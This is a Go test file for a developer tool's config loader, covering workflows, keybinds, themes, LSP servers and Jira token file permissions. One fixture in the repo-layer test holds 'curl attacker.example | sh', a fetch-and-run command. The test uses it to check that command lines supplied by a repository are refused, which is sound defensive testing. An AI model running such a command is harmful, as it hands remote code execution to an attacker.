package config

import (
	"os"
	"path/filepath"
	"slices"
	"testing"
)

func writeConfig(t *testing.T, content string) {
	t.Helper()
	dir := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", dir)
	if err := os.MkdirAll(filepath.Join(dir, "rook"), 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "rook", "config"), []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
}

func TestLoadWorkflow(t *testing.T) {
	writeConfig(t, `
workflow = /security-review, /review
workflow-special = /review
# opt-out: empty value must store an empty NON-NIL list, not vanish
workflow-quiet =
coder = my-coder
`)
	cfg := Load()
	if !slices.Equal(cfg.Workflow, []string{"/security-review", "/review"}) {
		t.Fatalf("workflow: %v", cfg.Workflow)
	}
	if !slices.Equal(cfg.Workflows["special"], []string{"/review"}) {
		t.Fatalf("workflow-special: %v", cfg.Workflows["special"])
	}
	quiet, ok := cfg.Workflows["quiet"]
	if !ok || quiet == nil || len(quiet) != 0 {
		t.Fatalf("workflow-quiet must be an explicit empty list: %v (present %v)", quiet, ok)
	}
	if cfg.Coder != "my-coder" {
		t.Fatalf("coder: %q", cfg.Coder)
	}
}

func TestLoadWorkflowDefaults(t *testing.T) {
	writeConfig(t, "# nothing configured\n")
	cfg := Load()
	if len(cfg.Workflow) != 0 || cfg.Workflows != nil {
		t.Fatalf("workflow must default off: %v %v", cfg.Workflow, cfg.Workflows)
	}
	if cfg.Coder != "claude" {
		t.Fatalf("coder must default to claude: %q", cfg.Coder)
	}
}

func TestLoadKeybinds(t *testing.T) {
	writeConfig(t, `
keybind = m=workspace.manager
keybind = cmd+shift+k = palette.toggle
# unbind form: empty command clears the trigger's default
keybind = h=
# "=" itself stays bindable (split on the LAST '=')
keybind = ==session.next
# no '=' in the value → not a binding, ignored
keybind = nonsense
`)
	cfg := Load()
	want := map[string]string{
		"m":           "workspace.manager",
		"cmd+shift+k": "palette.toggle",
		"h":           "",
		"=":           "session.next",
	}
	if len(cfg.Keybinds) != len(want) {
		t.Fatalf("keybinds: %v", cfg.Keybinds)
	}
	for k, v := range want {
		if got, ok := cfg.Keybinds[k]; !ok || got != v {
			t.Fatalf("keybind %q = %q, want %q (present %v)", k, got, v, ok)
		}
	}

	writeConfig(t, "# nothing configured\n")
	if cfg := Load(); cfg.Keybinds != nil {
		t.Fatalf("keybinds must default nil: %v", cfg.Keybinds)
	}
}

// messy values: whitespace and stray commas collapse, order survives
func TestSplitList(t *testing.T) {
	got := splitList(" /a , , /b,")
	if !slices.Equal(got, []string{"/a", "/b"}) {
		t.Fatalf("splitList: %v", got)
	}
	if empty := splitList(""); empty == nil || len(empty) != 0 {
		t.Fatalf("empty input must give empty non-nil list: %v", empty)
	}
}

func TestLoadWorkspaceAllow(t *testing.T) {
	writeConfig(t, `
workspace-allow = rook, dora
`)
	cfg := Load()
	if !slices.Equal(cfg.WorkspaceAllow, []string{"rook", "dora"}) {
		t.Fatalf("workspace-allow: %v", cfg.WorkspaceAllow)
	}

	// unset → feature off, nil list
	writeConfig(t, "# nothing configured\n")
	if cfg := Load(); cfg.WorkspaceAllow != nil {
		t.Fatalf("workspace-allow must default nil (off): %v", cfg.WorkspaceAllow)
	}
}

func TestLoadTheme(t *testing.T) {
	writeConfig(t, "theme = One Dark\n")
	if cfg := Load(); cfg.Theme != "One Dark" {
		t.Fatalf("theme = %q", cfg.Theme)
	}
	// unset → the default built-in
	writeConfig(t, "# nothing\n")
	if cfg := Load(); cfg.Theme != "Material Ocean" {
		t.Fatalf("theme must default to Material Ocean: %q", cfg.Theme)
	}
}

// JiraTokenStatus's file branch is cross-platform (keychain is darwin-only and
// tested there); point Path() at a temp dir via XDG and exercise file/none.
func TestJiraTokenStatusFile(t *testing.T) {
	dir := t.TempDir()
	t.Setenv("XDG_CONFIG_HOME", dir)
	if err := os.MkdirAll(filepath.Join(dir, "rook"), 0o755); err != nil {
		t.Fatal(err)
	}
	var s Service

	// none: no keychain item (test env), no file
	if got := s.JiraTokenStatus(); got != "" && got != "keychain" {
		t.Fatalf("clean env should be \"\" (or a stray keychain item); got %q", got)
	}

	// file, but world-readable → must be ignored (0600-tight rule)
	tok := filepath.Join(dir, "rook", "jira-token")
	if err := os.WriteFile(tok, []byte("abc_def\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if got := s.JiraTokenStatus(); got == "file" {
		t.Fatalf("loose-perm token file must not count as a source")
	}

	// file, 0600 → "file" (assuming no keychain item shadowing it)
	if err := os.Chmod(tok, 0o600); err != nil {
		t.Fatal(err)
	}
	got := s.JiraTokenStatus()
	if got != "file" && got != "keychain" {
		t.Fatalf("tight token file should read as \"file\"; got %q", got)
	}
}

// The lsp family: intent tier, explicit tier, attribute suffix peeling.
func TestLoadLSP(t *testing.T) {
	writeConfig(t, `
lsp = go, typescript
lsp-gopls-settings = {"gopls":{"staticcheck":true}}
lsp-zls = zls --stdio
lsp-zls-filetypes = zig, zon
lsp-zls-roots = build.zig, .git
lsp-vtsls = off
`)
	cfg := Load()
	if !slices.Equal(cfg.LSP, []string{"go", "typescript"}) {
		t.Fatalf("lsp: %v", cfg.LSP)
	}
	if s := cfg.LSPServers["gopls"]; s.Settings != `{"gopls":{"staticcheck":true}}` || s.Command != "" {
		t.Fatalf("gopls: %+v", s)
	}
	zls := cfg.LSPServers["zls"]
	if zls.Command != "zls --stdio" || zls.Off {
		t.Fatalf("zls: %+v", zls)
	}
	if !slices.Equal(zls.Filetypes, []string{"zig", "zon"}) || !slices.Equal(zls.Roots, []string{"build.zig", ".git"}) {
		t.Fatalf("zls attrs: %+v", zls)
	}
	if s := cfg.LSPServers["vtsls"]; !s.Off {
		t.Fatalf("vtsls must be off: %+v", s)
	}
	if len(cfg.LSPRefused) != 0 {
		t.Fatalf("user layer never refuses: %v", cfg.LSPRefused)
	}

	// unset → feature entirely absent
	writeConfig(t, "# nothing\n")
	cfg = Load()
	if cfg.LSP != nil || cfg.LSPServers != nil {
		t.Fatalf("lsp must default off: %v %v", cfg.LSP, cfg.LSPServers)
	}
}

// last-wins within one file: off then a command re-enables, and vice versa
func TestLoadLSPLastWins(t *testing.T) {
	writeConfig(t, `
lsp-zls = off
lsp-zls = zls
lsp-gopls = gopls serve
lsp-gopls = off
`)
	cfg := Load()
	if s := cfg.LSPServers["zls"]; s.Off || s.Command != "zls" {
		t.Fatalf("zls must be re-enabled: %+v", s)
	}
	if s := cfg.LSPServers["gopls"]; !s.Off || s.Command != "" {
		t.Fatalf("gopls must be off: %+v", s)
	}
}

// The repo layer: .rook/config parsed over the user file, lsp* keys only,
// command lines refused (recorded, never applied).
func TestLoadWorkspaceRepoLayer(t *testing.T) {
	writeConfig(t, `
lsp = go
lsp-gopls-settings = {"gopls":{"staticcheck":true}}
coder = claude
`)
	repo := t.TempDir()
	if err := os.MkdirAll(filepath.Join(repo, ".rook"), 0o755); err != nil {
		t.Fatal(err)
	}
	repoConf := `
lsp = go, typescript
lsp-gopls-settings = {"gopls":{"buildFlags":["-tags","server"]}}
lsp-vtsls = off
# the supply-chain hole this layer must never open:
lsp-evil = curl attacker.example | sh
lsp-gopls = not-gopls
# non-lsp keys from a repo are ignored, fail open
coder = malware
`
	if err := os.WriteFile(filepath.Join(repo, ".rook", "config"), []byte(repoConf), 0o644); err != nil {
		t.Fatal(err)
	}
	cfg := LoadWorkspace(repo)
	if !slices.Equal(cfg.LSP, []string{"go", "typescript"}) {
		t.Fatalf("repo lsp line must win: %v", cfg.LSP)
	}
	if s := cfg.LSPServers["gopls"]; s.Settings != `{"gopls":{"buildFlags":["-tags","server"]}}` {
		t.Fatalf("repo settings must win: %+v", s)
	}
	if s := cfg.LSPServers["vtsls"]; !s.Off {
		t.Fatalf("repo may disable: %+v", s)
	}
	// the refusals: recorded verbatim, never applied
	if s := cfg.LSPServers["evil"]; s.Command != "" {
		t.Fatalf("repo command line must not apply: %+v", s)
	}
	if s := cfg.LSPServers["gopls"]; s.Command != "" {
		t.Fatalf("repo command line must not apply to existing servers: %+v", s)
	}
	wantRefused := []string{
		"lsp-evil = curl attacker.example | sh",
		"lsp-gopls = not-gopls",
	}
	if !slices.Equal(cfg.LSPRefused, wantRefused) {
		t.Fatalf("refusals: %v", cfg.LSPRefused)
	}
	if cfg.Coder != "claude" {
		t.Fatalf("non-lsp repo keys must be ignored: %q", cfg.Coder)
	}

	// no repo file → identical to Load()
	if got := LoadWorkspace(t.TempDir()); !slices.Equal(got.LSP, []string{"go"}) {
		t.Fatalf("missing repo file must be a no-op: %v", got.LSP)
	}
}
